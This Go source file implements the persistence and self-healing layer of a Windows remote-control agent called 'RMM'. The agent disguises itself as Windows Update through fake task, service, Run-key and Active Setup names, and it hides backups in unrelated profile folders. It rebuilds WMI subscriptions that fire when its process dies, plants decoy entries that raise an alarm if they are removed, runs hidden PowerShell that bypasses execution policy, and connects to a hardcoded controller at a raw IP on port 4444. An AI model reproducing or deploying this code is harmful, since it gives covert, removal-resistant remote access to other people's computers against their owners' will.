//go:build windows

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
	"rmm/internal/commands"
	"rmm/internal/version"
)

// hiddenExec runs a console tool with its window suppressed. The watcher
// and healer run on user PCs: no flashing consoles, ever.
func hiddenExec(name string, args ...string) *exec.Cmd {
	c := exec.Command(name, args...)
	hideWatchCmd(c)
	return c
}

// ensureActiveSetupKey repairs the logon-time vector (StubPath is hidden
// powershell + detached Start-Process: no flash, never blocks logon).
func ensureActiveSetupKey(agentPath string) {
	want := `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
	if err != nil {
		return
	}
	defer k.Close()
	cur, _, err := k.GetStringValue("StubPath")
	if err != nil || cur != want {
		if err := k.SetStringValue("StubPath", want); err == nil {
			log.Printf("[watch] repaired Active Setup vector")
		}
	}
	_ = k.SetStringValue("Version", version.DesktopAgentVersion)
}

// rmmDataDir is where heartbeat/lock/telemetry live.
func rmmDataDir() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM")
	}
	return filepath.Join(os.TempDir(), "RMM")
}

// writeProtectionScore audits the six persistence layers (3 tasks, 2 Run
// values, WMI filter) and records "5/6" to protection.json, which the
// agent attaches to hellos so the controller alarms on drops.
func writeProtectionScore(w *watchCfg) {
	got, total := 0, 6
	for _, t := range []string{"WindowsUpdate", "WindowsUpdateWatchdog", "WindowsUpdateOrchestrator"} {
		if hiddenExec("schtasks", "/query", "/tn", t).Run() == nil {
			got++
		}
	}
	if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
		if _, _, err := rk.GetStringValue("WindowsUpdate"); err == nil {
			got++
		}
		if _, _, err := rk.GetStringValue("WindowsUpdateWatchdog"); err == nil {
			got++
		}
		rk.Close()
	}
	out, _ := hiddenExec("powershell", "-NoProfile", "-Command", `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='WindowsUpdateFilter'"`).CombinedOutput()
	if strings.Contains(string(out), "WindowsUpdateFilter") {
		got++
	}
	// Decoy heal vectors: alarm BEFORE repairing (a missing decoy means
	// someone is working through the box), then rebuild.
	if err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
		setProtAlarm("decoy task removed")
		xml := filepath.Join(w.backupDir, "decoy_task.xml")
		if _, err := os.Stat(xml); err == nil {
			_, _ = hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
			log.Printf("[watch] rebuilt decoy task")
		}
	}
	wantDecoy := `"` + w.agentPath + `" --wmi-heal`
	if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
		cur, _, err := rk.GetStringValue("WindowsUpdateCheck")
		rk.Close()
		if err != nil || cur != wantDecoy {
			setProtAlarm("decoy reg removed")
			if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
				_ = k.SetStringValue("WindowsUpdateCheck", wantDecoy)
				k.Close()
				log.Printf("[watch] rebuilt decoy Run value")
			}
		}
	}
	_ = os.MkdirAll(rmmDataDir(), 0755)
	rec := map[string]string{
		"layers": fmt.Sprintf("%d/%d", got, total),
		"at":     time.Now().UTC().Format(time.RFC3339),
	}
	if b, err := os.ReadFile(filepath.Join(rmmDataDir(), "protection.json")); err == nil {
		var prev map[string]string
		if json.Unmarshal(b, &prev) == nil && prev["alarm"] != "" {
			rec["alarm"] = prev["alarm"] // sticky across score rewrites
		}
	}
	rb, _ := json.Marshal(rec)
	_ = os.WriteFile(filepath.Join(rmmDataDir(), "protection.json"), rb, 0644)
}

// svcName is the SYSTEM repair service (repairs only, never interactive).
const svcName = "WindowsUpdateOrchestrator"

// ensureService makes sure the repair service exists + runs (best effort:
// needs admin; plain users skip silently). Called by the watcher and the
// healer, so a deleted service converges back.
func ensureService(agentPath string) {
	if err := hiddenExec("sc", "query", svcName).Run(); err == nil {
		return
	}
	// Admin probe: creating services needs it; skip quietly without.
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return
	}
	k.Close()
	bin := `"` + agentPath + `" --svc-heal`
	_, _ = hiddenExec("sc", "create", svcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
	_, _ = hiddenExec("sc", "description", svcName, "Windows Update Orchestration Service").CombinedOutput()
	_, _ = hiddenExec("sc", "failure", svcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
	if err := hiddenExec("sc", "start", svcName).Run(); err == nil {
		log.Printf("[watch] repair service installed+started")
	}
}

// wmiTaskPairs maps every persistence task to its saved XML (kept both
// beside the backup and in the install dir; the WMI consumer runs as
// SYSTEM and can only rely on the install-dir copies).
var wmiTaskPairs = [][2]string{
	{"WindowsUpdate", "agent_task.xml"},
	{"WindowsUpdateWatchdog", "watchdog_task.xml"},
	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
}

// wmiSets mirrors the installer's two resurrection sets (primary +
// bland-named duplicate). Compiled in so the healer rebuilds them with
// zero disk dependency.
var wmiSets = [][4]string{
	{"WindowsUpdateFilter", "WindowsUpdateDeathFilter", "WindowsUpdateConsumer", "WindowsUpdateTimer"},
	{"SystemHealthFilter", "SystemHealthDeathFilter", "SystemHealthConsumer", "SystemHealthTimer"},
}

// ensureWmiLayer verifies both WMI resurrection sets exist and rebuilds
// any missing one from the compiled-in recipe (same as the installer).
// Called by the watcher and the SYSTEM healers, so deleting WMI no longer
// sticks: the surviving service/timer recreates it within minutes. Needs
// admin/SYSTEM; plain users fail silently and keep going.
func ensureWmiLayer(agentPath string) {
	consumer := `"` + agentPath + `" --wmi-heal`
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		chk := `$na='` + na + `';$nd='` + nd + `';` +
			`$n=(Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Measure-Object).Count;` +
			`if ($n -ge 2) { Write-Host 'WMI-OK' }`
		if out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", chk).CombinedOutput(); err == nil && strings.Contains(string(out), "WMI-OK") {
			continue
		}
		var sb strings.Builder
		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;`)
		sb.WriteString(`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;`)
		sb.WriteString(`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;`)
		sb.WriteString(`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;`)
		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
		sb.WriteString(`Write-Host 'WMI-OK'`)
		if out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput(); err != nil || !strings.Contains(string(out), "WMI-OK") {
			log.Printf("[heal] WMI set %s not rebuilt: %v %s", na, err, strings.TrimSpace(string(out)))
		} else {
			log.Printf("[heal] WMI set %s rebuilt", na)
		}
	}
}

// resolveTaskXML finds a task XML: install dir first, then any profile
// backup dir (three copies exist since v1.40.19).
func resolveTaskXML(dir, name string) string {
	cands := []string{filepath.Join(dir, name)}
	for _, d := range systemBackupDirs() {
		cands = append(cands, filepath.Join(d, name))
	}
	for _, p := range cands {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	return ""
}

// systemBackupDirs lists every plausible per-user backup dir on the box.
// The healer runs as SYSTEM, whose own profile holds no backups, so it
// scans all user profiles for a surviving copy.
func systemBackupDirs() []string {
	var dirs []string
	ents, err := os.ReadDir(`C:\Users`)
	if err != nil {
		return dirs
	}
	for _, e := range ents {
		if !e.IsDir() {
			continue
		}
		dirs = append(dirs,
			filepath.Join(`C:\Users`, e.Name(), "3D Objects", "blender"),
			filepath.Join(`C:\Users`, e.Name(), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache"))
	}
	return dirs
}

// healBinary restores a wiped install binary from the newest surviving
// backup across all profiles (version-guarded: never downgrades).
func healBinary(installDir, agentPath, caPath string) {
	if _, err := os.Stat(agentPath); err == nil {
		return // present
	}
	type cand struct{ bin, cert, tok, ver string }
	var best *cand
	dirs := systemBackupDirs()
	if v := vaultDir(); v != "" {
		dirs = append(dirs, v) // SYSTEM vault: copy of last resort
	}
	for _, d := range dirs {
		bin := filepath.Join(d, "MicrosoftWindowsClient.exe")
		cert := filepath.Join(d, "server.crt")
		if _, err := os.Stat(bin); err != nil {
			continue
		}
		if _, err := os.Stat(cert); err != nil {
			continue
		}
		if !backupVerified(bin) {
			continue // manifest mismatch: never restore untrusted bytes
		}
		ver := readVerFile(d)
		if best == nil || (ver != "" && best.ver != "" && verLess(best.ver, ver)) || (best.ver == "" && ver != "") {
			b, c := bin, cert
			tok := filepath.Join(d, "token.txt")
			if _, err := os.Stat(tok); err != nil {
				tok = ""
			}
			best = &cand{b, c, tok, ver}
		}
	}
	if best == nil {
		log.Printf("[heal] agent binary missing AND no backup anywhere")
		return
	}
	instVer := readVerFile(installDir)
	if best.ver != "" && instVer != "" && verLess(best.ver, instVer) {
		log.Printf("[heal] backup v%s older than installed v%s - skipping", best.ver, instVer)
		return
	}
	_ = os.MkdirAll(filepath.Dir(agentPath), 0755)
	if b, err := os.ReadFile(best.bin); err == nil {
		_ = os.WriteFile(agentPath, b, 0755)
	}
	if b, err := os.ReadFile(best.cert); err == nil {
		_ = os.WriteFile(caPath, b, 0644)
	}
	if best.tok != "" {
		if _, err := os.Stat(filepath.Join(installDir, "token.txt")); os.IsNotExist(err) {
			if b, err := os.ReadFile(best.tok); err == nil {
				_ = os.WriteFile(filepath.Join(installDir, "token.txt"), b, 0600)
			}
		}
	}
	// Operation mode travels with the install too (v1.42.3+).
	if _, err := os.Stat(filepath.Join(installDir, "mode.json")); os.IsNotExist(err) {
		for _, d := range systemBackupDirs() {
			if b, err := os.ReadFile(filepath.Join(d, "mode.json")); err == nil && len(bytes.TrimSpace(b)) > 0 {
				_ = os.WriteFile(filepath.Join(installDir, "mode.json"), b, 0644)
				break
			}
		}
	}
	if best.ver != "" {
		_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(best.ver+"\n"), 0644)
	}
	log.Printf("[heal] binary + cert restored from backup")
}

// runWmiHeal repairs binary + tasks + HKLM Run values and kickstarts the
// watcher task, then exits. Invoked by the WMI timer + death trigger (and
// manually), so a wiped box converges back in ~1min without reinstall.
// Runs as SYSTEM: also swaps staged updates a standard-user agent could
// not apply itself (restart is the supervisor's job).
func runWmiHeal() {
	commands.ApplyStagedUpdate()
	// Staged self-delete: WMI runs as SYSTEM, so it always owns the
	// teardown. Claim it (single executor) and exit; the service tick
	// re-entry is a no-op once files are gone.
	if claimDeletePending() {
		log.Printf("[heal] executing staged self-delete")
		executeTeardown()
		os.Exit(0)
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	dir, _ := filepath.Abs(filepath.Dir(exe))
	agentPath := filepath.Join(dir, "MicrosoftWindowsClient.exe")
	caPath := filepath.Join(dir, "server.crt")
	controllerAddr := "176.229.98.54:4444"
	if b, err := os.ReadFile(filepath.Join(dir, "controller.txt")); err == nil {
		if v := strings.TrimSpace(strings.Split(string(b), "\n")[0]); v != "" {
			controllerAddr = v
		}
	}
	healBinary(dir, agentPath, caPath)
	ensureWmiLayer(agentPath)
	for _, t := range wmiTaskPairs {
		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := resolveTaskXML(dir, t[1])
		if xml == "" {
			log.Printf("[heal] task %s missing and no saved XML anywhere", t[0])
			continue
		}
		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[heal] re-create task %s: %v %s", t[0], err, strings.TrimSpace(string(out)))
		} else {
			log.Printf("[heal] re-created task %s", t[0])
		}
	}
	agentCmd := `"` + agentPath + `" -controller ` + controllerAddr + ` -ca "` + caPath + `"`
	watchCmd := `"` + agentPath + `" --watch`
	for _, kv := range [][2]string{{"WindowsUpdate", agentCmd}, {"WindowsUpdateWatchdog", watchCmd}} {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			continue
		}
		cur, _, err := k.GetStringValue(kv[0])
		if err != nil || cur != kv[1] {
			if err := k.SetStringValue(kv[0], kv[1]); err == nil {
				log.Printf("[heal] repaired HKLM Run %s", kv[0])
			}
		}
		k.Close()
	}
	ensureActiveSetupKey(agentPath)
	ensureService(agentPath)
	// Decoy heal vectors too (task + Run value).
	if err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
		if xml := resolveTaskXML(dir, "decoy_task.xml"); xml != "" {
			_, _ = hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
		}
	}
	decoyCmd := `"` + agentPath + `" --wmi-heal`
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if cur, _, err := k.GetStringValue("WindowsUpdateCheck"); err != nil || cur != decoyCmd {
			_ = k.SetStringValue("WindowsUpdateCheck", decoyCmd)
		}
		k.Close()
	}
	// Kickstart now instead of waiting for the next tick: the repaired
	// tasks run in their own (user-session) context, keeping interactivity.
	for _, t := range []string{"WindowsUpdateWatchdog", "WindowsUpdate", "WindowsUpdateOrchestrator", "WindowsUpdateCheck"} {
		_ = hiddenExec("schtasks", "/run", "/tn", t).Run()
	}
}

// ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
// the XML copies saved beside the backup (self-healing persistence).
func ensureWatchPersistence(w *watchCfg) {
	agentCmd := `"` + w.agentPath + `" -controller ` + w.controllerAddr + ` -ca "` + w.caPath + `"`
	watchCmd := `"` + w.agentPath + `" --watch`
	setRun := func(name, val string) {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			return
		}
		defer k.Close()
		cur, _, err := k.GetStringValue(name)
		if err != nil || cur != val {
			if err := k.SetStringValue(name, val); err == nil {
				log.Printf("[watch] repaired HKLM Run %s", name)
			}
		}
	}
	setRun("WindowsUpdate", agentCmd)
	setRun("WindowsUpdateWatchdog", watchCmd)
	ensureActiveSetupKey(w.agentPath)
	ensureService(w.agentPath)
	ensureWmiLayer(w.agentPath)
	healDecoys(w)
	for _, t := range wmiTaskPairs {
		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := resolveTaskXML(w.installDir, t[1])
		if xml == "" {
			log.Printf("[watch] task %s missing and no saved XML in any copy", t[0])
			continue
		}
		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[watch] re-create task %s: %v %s", t[0], err, string(out))
		} else {
			log.Printf("[watch] re-created task %s", t[0])
		}
	}
}
